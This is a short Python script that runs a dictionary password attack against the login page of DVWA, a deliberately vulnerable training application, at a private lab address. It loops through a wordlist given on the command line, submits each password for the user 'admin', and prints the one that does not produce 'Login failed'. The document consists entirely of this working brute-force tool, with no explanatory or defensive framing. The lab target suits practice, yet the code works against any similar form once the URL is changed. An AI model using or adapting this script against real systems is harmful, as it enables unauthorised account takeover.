#can be check https://stackoverflow.com/questions/39070480/python-bruteforce-script


#!/usr/bin/env python


import mechanize
import sys
import re
from bs4 import BeautifulSoup

br = mechanize.Browser()


response1 = br.open('http://192.168.30.143/dvwa/login.php')
fd=open(sys.argv[1],"r")
for line in fd.readlines():
        passwd=(line.strip())
        try:
                br.select_form(nr=0)
                br.set_value("admin", name="username", nr=0)
                br.set_value(passwd, name="password", nr=0)
                #print ("Checking the password :::%s " % (passwd))
                br.submit()
                #print br.response().read()
                soup = BeautifulSoup(br.response().read(),'lxml')
                content=soup.text
                if re.search("Login failed",content):
                        print ("Failed password is %s" %(passwd))
                        continue
                else:
                        print ("Correct password is :::  %s " % (passwd))
                        break
        except:
                print ("Nothing")
